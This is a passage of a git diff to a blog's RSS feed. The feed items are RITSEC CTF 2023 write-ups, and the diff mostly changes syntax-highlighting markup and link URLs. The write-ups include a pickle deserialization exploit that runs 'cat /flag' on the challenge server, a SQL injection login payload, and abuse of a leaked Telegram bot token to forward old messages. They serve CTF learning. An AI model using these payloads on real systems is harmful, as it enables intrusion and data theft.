-    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;https://pickles-web.challenges.ctf.ritsec.club/order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -360,9 +483,9 @@ Why these commands?  They’re how I would go about getting a script onto a linu
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here's your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here&apos;s your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;b&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;uid=1000(user) gid=1000(user) groups=1000(user)\n&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'button'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;button&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -374,16 +497,16 @@ Why these commands?  They’re how I would go about getting a script onto a linu
 
 &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],))&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,([&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/flag&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],))&lt;/span&gt;
 
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;https://pickles-web.challenges.ctf.ritsec.club/order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -392,8 +515,8 @@ Why these commands?  They’re how I would go about getting a script onto a linu
 &lt;p&gt;Encoding issues using the browser’s console to base64decode the cookie value sent me down a weird rabbit hole.  It was only showing me the text of the class name, but not the un-readable characters.  I SHOULD have known it was binary data, but I overlooked it and wasted about 20 minutes on that.  Lesson learned!!!!&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/web/pickle-store</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/pickle-store</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store</guid>
       </item>
     
       <item>
@@ -421,8 +544,8 @@ The first thing I noticed was that the first two skills started with &lt;code cl
 &lt;p&gt;I like the idea of this challenge because it emphasizes the importance of OPsec and what you should and shouldn’t share online.  With that said, it just wasn’t my cup to tea so I decided to focus on the web challenges more.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/misc/new-hire</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/misc/new-hire</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/misc/new-hire</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/misc/new-hire</guid>
       </item>
     
       <item>
@@ -431,7 +554,7 @@ The first thing I noticed was that the first two skills started with &lt;code cl
 &lt;p&gt;You are given a page that links to a python snippet.  This snippet looks to encrypt a string using xor.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#! /usr/bin/env python
 &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XXXXXXXXXXXXXXXXXXXXX&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;XXXXXXXXXXXXXXXXXXXXX&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;enc_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;241&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;166&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;252&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
@@ -461,8 +584,8 @@ Additionally, there’s a setting for “Knowing the key size (in bytes)”.  We
 &lt;p&gt;This was another case of me being lazy instead of truly understanding how to reverse engineer these crypto algos. I got the flag, but I really should have spent the time to understand how it worked more.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/crypto/either-or-neither-nor</guid>
       </item>
     
       <item>
@@ -531,8 +654,8 @@ Boom!  We got a remote code execution.  Now we just need to find that pesky flag
 &lt;p&gt;I liked this challenge because of the “easy” remote code execution, however, I was really surprised to see how simple the logic actually was.  I was assuming there was some filtering in place to prevent code exfiltration or something similar, but that wasn’t the case!  This really brings to light the benefit of having source code available for gray-box testing.  If this were for a pen-test, I would have written up steps to reproduce that were both inaccurate and overly complicated.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/web/echoes</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/echoes</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/web/echoes</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/web/echoes</guid>
       </item>
     
       <item>
@@ -545,9 +668,9 @@ Boom!  We got a remote code execution.  Now we just need to find that pesky flag
 Unknown: &quot;DUDE YOU... [STATIC] BELIEVE WHERE AND WHAT WE ARE TRANSMITTING FROM!&quot;
 Walter: &quot;Your connection sounds fuzzy, theres no way you are using an antenna.&quot;
 Unknown: &quot;WE MADE OUR OWN USING TH... [STATIC]&quot;
-Walter: &quot;I'm losing you, what the hell are you talking about?&quot;
+Walter: &quot;I&apos;m losing you, what the hell are you talking about?&quot;
 Unkown: &quot;THERE IS NEWS REPORTING ABOUT IT, RIT LET US USE... [STATIC] THE ANTENNA.&quot;
-Walter: &quot;Dog what are you saying, you're on the news? Where are you?!&quot;
+Walter: &quot;Dog what are you saying, you&apos;re on the news? Where are you?!&quot;
 Unknown: &quot;YEAH LOOK IT UP, OUR LOCATION IS... [STATIC].[STATIC].[STATIC]&quot;
 Walter: &quot;What kind of location uses three words?&quot;
 Unknown: &quot;I SEE MUNSON&quot;
@@ -572,14 +695,14 @@ Walter: &quot;I need to try and find his location and flag him down, that made n
 &lt;p&gt;I shouldn’t have given up when I did.  I have followed the clues correctly, but my search for the antenna overlooked the &lt;a href=&quot;https://hackaday.com/2023/03/23/enormous-metal-sculpture-becomes-an-antenna/&quot;&gt;Hackaday Artile&lt;/a&gt; that would have given me the correct location.  In the future, when I get stuck on a wrong answer, I should retrace my steps and double check my previous assumptions.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/misc/connection-terminated</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/misc/connection-terminated</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/misc/connection-terminated</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/misc/connection-terminated</guid>
       </item>
     
       <item>
         <title>RITSEC 2023 - Web / Broken Bot</title>
         <description>&lt;h1 id=&quot;exploring-the-app&quot;&gt;Exploring the App&lt;/h1&gt;
-&lt;p&gt;Launching the site, you are brought to a login page where the username is already set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whiteteam at rit dot edu&lt;/code&gt;. My first thoughts were with regard to SQL Injection or default credentials.  I started with your standard sql injection attack by adding a password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1-- -&lt;/code&gt;.  What happened next was quite interesting, and somewhat comical!  After a brief pause, you are redirected to another site with someone’s &lt;a href=&quot;https://archive.org/details/VoiceMail_173&quot;&gt;voicemail recording&lt;/a&gt;.  …Yep, nobody’s there right now.  Where this is a separate site, my assumption is that it’s not part of the challenge, and we missed something interesting on the login form.  Let’s go back to that.&lt;/p&gt;
+&lt;p&gt;Launching the site, you are brought to a login page where the username is already set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whiteteam at rit dot edu&lt;/code&gt;. My first thoughts were with regard to SQL Injection or default credentials.  I started with your standard sql injection attack by adding a password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1-- -&lt;/code&gt;.  What happened next was quite interesting, and somewhat comical!  After a brief pause, you are redirected to another site with someone’s &lt;a href=&quot;https://archive.org/details/VoiceMail_173&quot;&gt;voicemail recording&lt;/a&gt;.  …Yep, nobody’s there right now.  Where this is a separate site, my assumption is that it’s not part of the challenge, and we missed something interesting on the login form.  Let’s go back to that.&lt;/p&gt;
 
 &lt;h1 id=&quot;how-did-we-get-there&quot;&gt;How Did We Get There?&lt;/h1&gt;
 &lt;p&gt;This time, I have my network tools open in my browser so I can watch the traffic.  I also start looking at the source code, and find a whole bunch of obfsucated JavaScript.  Having a background in JS, I start trying to un-obfsucate it…. and I finally get to the point where I realize I’m wasting my time a bit.  I don’t need to do all of that work yet, if I still don’t understand the &lt;em&gt;behavior&lt;/em&gt; of the site.  This is probably a rabbit hole that I don’t need to follow.&lt;/p&gt;
@@ -659,7 +782,7 @@ DateSent : 1/28/2023 2:55:30 p.m.
 &lt;h2 id=&quot;how-do-we-read-a-previous-message&quot;&gt;How do we read a previous Message?&lt;/h2&gt;
 &lt;p&gt;I’m quite sure at this point I need to exfil old messages from the specific chat.  I noted earlier that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendMessage&lt;/code&gt; api returns a Message object, let’s see if we can find any other endpoints that will do the same. I searched the api documentation for the exact phrase. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message is returned&lt;/code&gt;.  There are a lot of results (24 or so), but the 2nd instance is for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forwardMessage&lt;/code&gt;.
 &lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/broken-bot/forwardMessage.png&quot; alt=&quot;Telegram's forwardMessage API Reference&quot; title=&quot;Telegram's forwardMessage API Reference&quot; /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/broken-bot/forwardMessage.png&quot; alt=&quot;Telegram&apos;s forwardMessage API Reference&quot; title=&quot;Telegram&apos;s forwardMessage API Reference&quot; /&gt;
 &lt;br /&gt;&lt;br /&gt;
 There’s no need to be quiet in this scenario, so we can probably forward the message back into the same channel without consequence.  Let’s start by just checking the first known message in this chat, and keep going until we find it.  Our request will look something like this:&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://api.telegram.org/xxxx:xxxx/forwardMessage?chat_id=5852841790&amp;amp;from_chat_id=5852841790&amp;amp;message_id=1
@@ -702,8 +825,8 @@ There’s no need to be quiet in this scenario, so we can probably forward the m
 &lt;p&gt;I &lt;em&gt;REALLY&lt;/em&gt; enjoyed this challenge! I actually liked that the JavaScript was a rabbit-hole, as it’s helping me focus my time on more meaningful enumeration.  While I eventually would have figured out what the JS was doing by de-obfuscating it, I was easily able to figure it out just by watching the &lt;em&gt;behavior&lt;/em&gt;.  Additionally, this is more of a real-world scenario where someone sets up a bot or automation, and doesn’t do enough to protect the credentials.  In this case, it appears that the bot’s URL is kind of like a webhook URL, in that you &lt;strong&gt;need to protect it the same way you do passwords&lt;/strong&gt;, otherwise bad actors could abuse it.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/web/broken-bot</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/broken-bot</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot</guid>
       </item>
     
       <item>
